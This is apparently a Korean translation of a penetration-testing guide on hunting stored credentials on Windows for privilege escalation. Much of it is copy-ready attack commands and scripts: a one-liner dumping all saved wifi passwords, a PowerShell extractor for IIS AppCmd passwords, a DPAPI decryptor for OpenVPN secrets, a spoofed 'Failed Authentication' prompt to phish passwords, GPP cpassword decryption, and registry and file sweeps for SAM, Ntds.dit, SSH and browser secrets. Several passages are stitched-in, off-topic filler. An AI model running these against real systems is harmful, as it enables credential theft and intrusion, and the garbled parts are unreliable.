와이파이 네트워크는 WEP, WPA 및 WPA2와 같은 다양한 암호화 프로토콜을 사용하여 무단 접근을 방지합니다. 그러나 해커들은 와이파이 네트워크를 침해하고 무단 접근을 얻기 위해 여러 기술을 사용할 수 있습니다.

Some common wifi hacking techniques include:

일반적인 와이파이 해킹 기술은 다음과 같습니다:

1. **Brute-forcing**: This involves trying all possible combinations of passwords until the correct one is found.

1. **무차별 대입 공격**: 이는 올바른 비밀번호가 발견될 때까지 모든 가능한 비밀번호 조합을 시도하는 것을 의미합니다.

2. **Dictionary attacks**: This involves using a pre-generated list of commonly used passwords to try and gain access to the wifi network.

2. **사전 공격**: 이는 일반적으로 사용되는 비밀번호의 사전 목록을 사용하여 와이파이 네트워크에 접근을 시도하는 것을 의미합니다.

3. **Evil twin attacks**: This involves creating a fake wifi network with the same name as a legitimate network to trick users into connecting to it.

3. **악성 쌍둥이 공격**: 이는 사용자들이 연결하도록 속이기 위해 합법적인 네트워크와 동일한 이름의 가짜 와이파이 네트워크를 생성하는 것을 의미합니다.

4. **Packet sniffing**: This involves capturing and analyzing network traffic to obtain sensitive information such as passwords or login credentials.

4. **패킷 스니핑**: 이는 패스워드나 로그인 자격 증명과 같은 민감한 정보를 얻기 위해 네트워크 트래픽을 캡처하고 분석하는 것을 의미합니다.

To protect your wifi network from being hacked, it is important to use strong passwords, regularly update your router's firmware, and enable network encryption. Additionally, it is recommended to disable remote administration and regularly monitor your network for any suspicious activity.

와이파이 네트워크가 해킹되는 것을 방지하기 위해서는 강력한 비밀번호를 사용하고, 라우터의 펌웨어를 정기적으로 업데이트하고, 네트워크 암호화를 활성화하는 것이 중요합니다. 또한 원격 관리를 비활성화하고, 의심스러운 활동을 정기적으로 모니터링하는 것이 권장됩니다.
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 저장된 RDP 연결

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\` 및 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`에서 찾을 수 있습니다.

### 최근 실행된 명령어
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **원격 데스크톱 자격 증명 관리자**

The Remote Desktop Credential Manager is a Windows feature that allows users to store and manage their remote desktop credentials. These credentials are used to authenticate and establish a remote desktop connection to another computer or server.

원격 데스크톱 자격 증명 관리자는 사용자가 원격 데스크톱 자격 증명을 저장하고 관리할 수 있는 Windows 기능입니다. 이러한 자격 증명은 다른 컴퓨터나 서버에 대한 원격 데스크톱 연결을 인증하고 설정하는 데 사용됩니다.
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz**의 `dpapi::rdg` 모듈을 사용하여 적절한 `/masterkey`로 **.rdg 파일을 복호화**할 수 있습니다.\
Mimikatz의 `sekurlsa::dpapi` 모듈을 사용하여 메모리에서 **여러 DPAPI 마스터키를 추출**할 수 있습니다.

### Sticky Notes

사람들은 종종 Windows 워크스테이션에서 StickyNotes 앱을 사용하여 비밀번호 및 기타 정보를 저장합니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 위치하며 항상 검색하고 조사할 가치가 있습니다.

### AppCmd.exe

**AppCmd.exe에서 비밀번호를 복구하려면 관리자 권한으로 실행하고 높은 무결성 수준에서 실행해야 함을 유의하세요.**\
**AppCmd.exe**는 `%systemroot%\system32\inetsrv\` 디렉토리에 위치합니다.\
이 파일이 존재한다면 일부 **자격 증명**이 구성되어 있고 복구할 수 있을 수도 있습니다.

이 코드는 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)에서 추출되었습니다.
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` 파일이 존재하는지 확인합니다.\
설치 프로그램은 **SYSTEM 권한으로 실행**되며, 많은 설치 프로그램들은 **DLL Sideloading 취약점**에 취약합니다 (자세한 정보는 [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)에서 확인 가능).
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 파일 및 레지스트리 (자격 증명)

### Putty 자격 증명

Putty는 SSH 및 Telnet 클라이언트로 널리 사용되는 프로그램입니다. Putty는 사용자의 로그인 자격 증명을 저장하는 데 사용되는 여러 파일과 레지스트리 항목을 가지고 있습니다.

#### Putty 설정 파일

Putty는 사용자의 설정과 자격 증명을 저장하기 위해 `putty.reg` 또는 `putty.ini`와 같은 설정 파일을 사용합니다. 이 파일은 일반적으로 사용자의 홈 디렉토리에 위치하며, 사용자의 로그인 자격 증명을 포함할 수 있습니다.

#### Putty 세션 저장소

Putty는 사용자의 세션 정보를 저장하기 위해 `sessions` 디렉토리를 사용합니다. 이 디렉토리는 일반적으로 사용자의 홈 디렉토리에 위치하며, 각 세션은 별도의 파일로 저장됩니다. 이 파일들은 사용자의 로그인 자격 증명을 포함할 수 있습니다.

#### Putty 레지스트리 항목

Putty는 사용자의 로그인 자격 증명을 저장하기 위해 레지스트리 항목을 사용합니다. 이러한 항목은 `HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions` 경로에 저장됩니다. 각 세션은 별도의 하위 키로 저장되며, 사용자의 로그인 자격 증명을 포함할 수 있습니다.

### Putty Creds 추출

Putty 자격 증명을 추출하기 위해서는 다음 단계를 따르십시오.

1. Putty 설정 파일 (`putty.reg` 또는 `putty.ini`)을 확인하여 사용자의 로그인 자격 증명을 찾습니다.
2. `sessions` 디렉토리에서 각 세션 파일을 확인하여 사용자의 로그인 자격 증명을 찾습니다.
3. 레지스트리에서 `HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions` 경로 아래의 각 세션 하위 키를 확인하여 사용자의 로그인 자격 증명을 찾습니다.

Putty 자격 증명을 추출하면 사용자의 SSH 및 Telnet 로그인 정보를 알 수 있습니다. 이 정보를 사용하여 권한 상승 등의 공격을 수행할 수 있습니다.
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 호스트 키

Putty는 Windows 운영 체제에서 SSH 연결을 위해 널리 사용되는 클라이언트입니다. Putty를 사용하여 SSH 연결을 설정할 때, 호스트 키를 검증하는 과정이 중요합니다. 호스트 키는 서버의 신원을 확인하고 연결의 무결성을 보장하는 역할을 합니다.

Putty는 호스트 키를 저장하기 위해 레지스트리에 사용자 설정을 저장합니다. 이러한 키는 다음 경로에 저장됩니다.

```
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\SshHostKeys
```

Putty는 호스트 키를 다음과 같은 형식으로 저장합니다.

```
<알고리즘> <키 형식> <키 데이터>
```

여기서 `<알고리즘>`은 호스트 키의 암호화 알고리즘을 나타내며, `<키 형식>`은 호스트 키의 형식을 나타냅니다. `<키 데이터>`는 호스트 키의 실제 데이터입니다.

Putty는 호스트 키를 검증할 때, 이러한 정보를 사용하여 호스트 키를 신뢰할 수 있는지 확인합니다. 따라서 호스트 키를 검증하는 과정에서 이러한 정보를 확인하는 것이 중요합니다.

Putty SSH 호스트 키를 관리하는 것은 보안을 강화하는 데 중요한 역할을 합니다. 호스트 키를 신뢰할 수 없는 경우, 중간자 공격 등의 보안 위협에 노출될 수 있습니다. 따라서 호스트 키를 신중하게 관리하고, 신뢰할 수 있는 호스트 키만 사용하는 것이 좋습니다.
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 레지스트리에 저장된 SSH 키

SSH 개인 키는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys` 내에 저장될 수 있으므로 해당 위치에 흥미로운 내용이 있는지 확인해야 합니다:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
만약 해당 경로에서 항목을 찾으면 아마 저장된 SSH 키일 것입니다. 이 키는 암호화되어 저장되어 있지만 [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract)를 사용하여 쉽게 복호화할 수 있습니다.\
이 기술에 대한 자세한 정보는 여기에서 확인할 수 있습니다: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` 서비스가 실행되지 않고 부팅 시 자동으로 시작하도록 하려면 다음을 실행하세요:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
이 기술은 더 이상 유효하지 않은 것 같습니다. 몇 가지 ssh 키를 생성하려고 시도하고 `ssh-add`를 사용하여 키를 추가하고 ssh를 통해 머신에 로그인했습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys가 존재하지 않으며 procmon은 비대칭 키 인증 중 `dpapi.dll`의 사용을 식별하지 못했습니다.
{% endhint %}

### 비지니스용 파일
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
다음은 **metasploit**을 사용하여 이러한 파일을 검색할 수도 있습니다: _post/windows/gather/enum\_unattend_

예시 내용:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM 및 SYSTEM 백업

It is common for Windows systems to create backups of the SAM and SYSTEM files, which contain important security information such as user account passwords. These backups can be used to perform offline attacks and escalate privileges on a compromised system.

Windows stores these backups in the following locations:

- `%SystemRoot%\Repair\SAM`
- `%SystemRoot%\System32\Config\SAM`

To access these backups, you will need to have administrative privileges on the target system. Once you have obtained the backups, you can use tools like `samdump2` or `pwdump` to extract the password hashes from the SAM file.

Keep in mind that these backups are only available if they have been created by the system. If the backups do not exist, you will need to explore other privilege escalation techniques.
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 클라우드 자격 증명

Cloud credentials refer to the authentication information used to access and manage cloud services and resources. These credentials typically include a username and password, API keys, access tokens, or other forms of authentication tokens.

클라우드 자격 증명은 클라우드 서비스 및 리소스에 액세스하고 관리하기 위해 사용되는 인증 정보를 의미합니다. 이러한 자격 증명은 일반적으로 사용자 이름과 비밀번호, API 키, 액세스 토큰 또는 기타 형태의 인증 토큰을 포함합니다.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** 파일을 찾습니다.

### Cached GPP Password

이전에는 Group Policy Preferences (GPP)를 통해 일련의 컴퓨터에 사용자 정의 로컬 관리자 계정을 배포할 수 있는 기능이 제공되었습니다. 그러나 이 방법에는 중대한 보안 결함이 있었습니다. 첫째로, SYSVOL에 XML 파일로 저장된 Group Policy Objects (GPO)는 모든 도메인 사용자가 액세스할 수 있었습니다. 둘째로, 이러한 GPP 내의 암호는 공개 문서화된 기본 키를 사용하여 AES256으로 암호화되었으며, 인증된 사용자는 이를 복호화할 수 있었습니다. 이는 사용자가 권한을 상승시킬 수 있어 심각한 위험을 초래할 수 있었습니다.

이러한 위험을 완화하기 위해, "cpassword" 필드가 비어 있지 않은 로컬 캐시된 GPP 파일을 검색하는 기능이 개발되었습니다. 이러한 파일을 찾으면, 해당 기능은 암호를 복호화하고 사용자 정의 PowerShell 객체를 반환합니다. 이 객체에는 GPP 및 파일의 위치에 대한 세부 정보가 포함되어 있어 이 보안 취약점의 식별과 해결에 도움이 됩니다.

`C:\ProgramData\Microsoft\Group Policy\history` 또는 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista 이전)_에서 다음 파일을 검색합니다:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPassword를 복호화하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec를 사용하여 비밀번호를 얻는 방법:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS 웹 구성

IIS (Internet Information Services)는 Microsoft Windows 운영 체제에서 실행되는 웹 서버 소프트웨어입니다. IIS 웹 구성은 IIS 서버의 동작 및 기능을 제어하는 설정 파일입니다. 이 파일은 XML 형식으로 작성되며, 웹 응용 프로그램의 동작을 세부적으로 구성할 수 있습니다.

#### 웹 구성 파일의 위치

IIS 웹 구성 파일은 보통 다음 경로에 위치합니다.

```
C:\Windows\System32\inetsrv\config\applicationHost.config
```

#### 웹 구성 파일의 구조

IIS 웹 구성 파일은 다음과 같은 구조를 가지고 있습니다.

```xml
<configuration>
  <system.webServer>
    <!-- 웹 서버 설정 -->
  </system.webServer>
</configuration>
```

`<system.webServer>` 요소는 웹 서버의 설정을 포함하고 있으며, 이 안에 다양한 하위 요소들이 있습니다. 각 하위 요소는 특정 기능 또는 동작을 구성하는 데 사용됩니다.

#### 웹 구성 파일 수정

IIS 웹 구성 파일을 수정하여 웹 서버의 동작을 변경할 수 있습니다. 이를 통해 보안 강화, 성능 향상, 기능 추가 등 다양한 작업을 수행할 수 있습니다. 웹 구성 파일을 수정하는 방법은 다음과 같습니다.

1. 웹 구성 파일을 백업합니다.
2. 텍스트 편집기를 사용하여 웹 구성 파일을 엽니다.
3. 원하는 변경 사항을 적용합니다.
4. 파일을 저장하고 닫습니다.
5. 변경 사항이 적용되었는지 확인합니다.

#### 웹 구성 파일의 보안

IIS 웹 구성 파일은 웹 서버의 중요한 설정 정보를 포함하고 있으므로, 이 파일에 대한 액세스 권한을 제한하는 것이 중요합니다. 웹 구성 파일의 보안을 강화하기 위해 다음과 같은 조치를 취할 수 있습니다.

- 웹 구성 파일의 위치를 안전한 디렉토리로 이동시킵니다.
- 웹 구성 파일의 액세스 권한을 최소한으로 설정합니다.
- 웹 구성 파일에 대한 변경 이력을 모니터링합니다.
- 웹 구성 파일을 주기적으로 검토하여 보안 취약점을 확인합니다.

#### 웹 구성 파일의 중요성

IIS 웹 구성 파일은 웹 서버의 동작을 제어하는 핵심 파일입니다. 따라서 웹 구성 파일에 대한 이해와 적절한 관리는 웹 서버의 보안 및 성능에 큰 영향을 미칩니다. 웹 구성 파일을 신중하게 관리하여 웹 서버를 안전하고 효율적으로 운영할 수 있도록 합니다.
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
웹 구성 파일(web.config)의 자격 증명 예시:

```xml
<configuration>
  <appSettings>
    <add key="DatabaseUsername" value="admin" />
    <add key="DatabasePassword" value="password123" />
  </appSettings>
</configuration>
```

위의 예시는 웹 구성 파일(web.config)에 자격 증명 정보가 포함된 예시입니다.
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 자격 증명

To establish a connection with an OpenVPN server, you will need the following credentials:

- **Username**: Your assigned username for the OpenVPN server.
- **Password**: Your assigned password for the OpenVPN server.

These credentials are provided by the administrator or the organization managing the OpenVPN server. Make sure to keep them confidential and avoid sharing them with unauthorized individuals.

### OpenVPN 자격 증명

OpenVPN 서버와의 연결을 설정하기 위해 다음 자격 증명이 필요합니다:

- **사용자 이름**: OpenVPN 서버에 할당된 사용자 이름입니다.
- **비밀번호**: OpenVPN 서버에 할당된 비밀번호입니다.

이러한 자격 증명은 관리자 또는 OpenVPN 서버를 관리하는 조직에서 제공합니다. 이를 비밀로 유지하고 무단으로 공유하지 않도록 주의하세요.
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그

로그는 시스템 및 애플리케이션의 활동을 기록하는 중요한 도구입니다. 로그는 보안 사고 조사, 문제 해결, 성능 모니터링 등에 유용하게 사용됩니다. 로그는 일반적으로 시간, 이벤트 유형, 사용자 활동, 오류 및 경고 메시지 등의 정보를 포함합니다.

로그 파일은 일반적으로 텍스트 형식으로 저장되며, 주로 시스템 이벤트 로그, 보안 로그, 애플리케이션 로그 등으로 구분됩니다. 이러한 로그 파일은 시스템에 의해 자동으로 생성되며, 중요한 정보를 포함할 수 있습니다.

로그 파일은 해커에게도 유용한 정보를 제공할 수 있습니다. 해커는 로그 파일을 분석하여 시스템의 취약점을 찾거나, 사용자의 인증 정보를 탈취하는 등의 공격을 수행할 수 있습니다. 따라서 로그 파일은 보안을 강화하기 위해 적절히 관리되어야 합니다.

로그 파일을 안전하게 보호하기 위해서는 다음과 같은 조치를 취할 수 있습니다:

- 로그 파일의 액세스 권한을 제한합니다.
- 로그 파일을 안전한 위치에 저장합니다.
- 로그 파일을 정기적으로 백업하고, 백업된 파일을 안전한 곳에 보관합니다.
- 로그 파일을 암호화하여 외부에서의 접근을 방지합니다.
- 로그 파일을 모니터링하여 이상한 활동을 탐지하고 대응합니다.

로그 파일은 시스템 보안에 있어서 중요한 역할을 수행하므로, 적절한 관리와 모니터링이 필요합니다.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 자격 증명 요청

항상 **사용자에게 자격 증명을 입력하도록 요청할 수 있습니다. 심지어 다른 사용자의 자격 증명도** 알고 있을 것으로 생각된다면 (클라이언트에게 **직접 자격 증명을 요청하는 것은 정말로 위험**합니다):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **자격증명을 포함할 수 있는 가능한 파일 이름**

과거에 암호를 **평문**이나 **Base64**로 포함하고 있었던 알려진 파일들입니다.
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
모든 제안된 파일을 검색하세요.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin에 있는 자격 증명

Bin을 확인하여 그 안에 있는 자격 증명을 확인해야 합니다.

여러 프로그램에서 저장된 **비밀번호를 복구**하기 위해 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### 레지스트리 내부

**자격 증명이 있는 다른 가능한 레지스트리 키**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**레지스트리에서 openssh 키 추출하기**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 브라우저 기록

**Chrome 또는 Firefox**에서 저장된 비밀번호가 있는 데이터베이스를 확인해야 합니다.\
또한 브라우저의 기록, 즐겨찾기 및 즐겨찾기에도 **비밀번호가 저장**되어 있을 수 있습니다.

브라우저에서 비밀번호를 추출하는 도구:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL 덮어쓰기**

**Component Object Model (COM)**은 Windows 운영 체제 내에 구축된 기술로, 서로 다른 언어로 작성된 소프트웨어 구성 요소 간의 **상호 통신**을 가능하게 합니다. 각 COM 구성 요소는 **클래스 ID (CLSID)**를 통해 식별되며, 각 구성 요소는 하나 이상의 인터페이스를 통해 기능을 노출시킵니다. 이 인터페이스는 인터페이스 ID (IID)로 식별됩니다.

COM 클래스와 인터페이스는 레지스트리의 **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** 및 **HKEY\_**_**CLASSES\_**_**ROOT\Interface**에 정의됩니다. 이 레지스트리는 **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes**를 병합하여 생성됩니다. 즉, **HKEY\_**_**CLASSES\_**_**ROOT**입니다.

이 레지스트리의 CLSID 내부에서는 **InProcServer32**라는 하위 레지스트리를 찾을 수 있으며, 이 하위 레지스트리에는 **DLL**을 가리키는 **기본값**과 **ThreadingModel**이라는 값이 포함되어 있습니다. **ThreadingModel** 값은 **Apartment** (단일 스레드), **Free** (다중 스레드), **Both** (단일 또는 다중) 또는 **Neutral** (스레드 중립)일 수 있습니다.

![](<../../.gitbook/assets/image (638).png>)

기본적으로, 실행될 DLL 중 하나를 **덮어쓸 수 있다면**, 다른 사용자가 해당 DLL을 실행할 경우 **권한 상승**이 가능합니다.

COM Hijacking을 영속성 메커니즘으로 사용하는 공격자의 방법을 알아보려면 다음을 참조하세요:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **파일 및 레지스트리에서 일반적인 비밀번호 검색**

**파일 내용을 검색**하세요.
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일 이름으로 파일 검색하기**

파일 시스템에서 특정 파일 이름을 가진 파일을 검색하는 방법입니다.

```bash
# Windows
dir /s /b C:\*filename*

# Linux
find / -name *filename*
```

위의 명령어는 각각 Windows와 Linux 운영체제에서 사용할 수 있습니다. `filename` 부분에는 검색하려는 파일의 이름을 입력하면 됩니다. 이 명령어를 실행하면 해당 파일 이름을 가진 모든 파일의 경로가 출력됩니다.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호 검색하기**

레지스트리는 Windows 운영 체제에서 중요한 구성 데이터를 저장하는 데이터베이스입니다. 로컬 관리자 권한을 가진 사용자는 레지스트리를 검색하여 시스템에서 사용되는 키 이름과 비밀번호와 같은 중요한 정보를 찾을 수 있습니다.

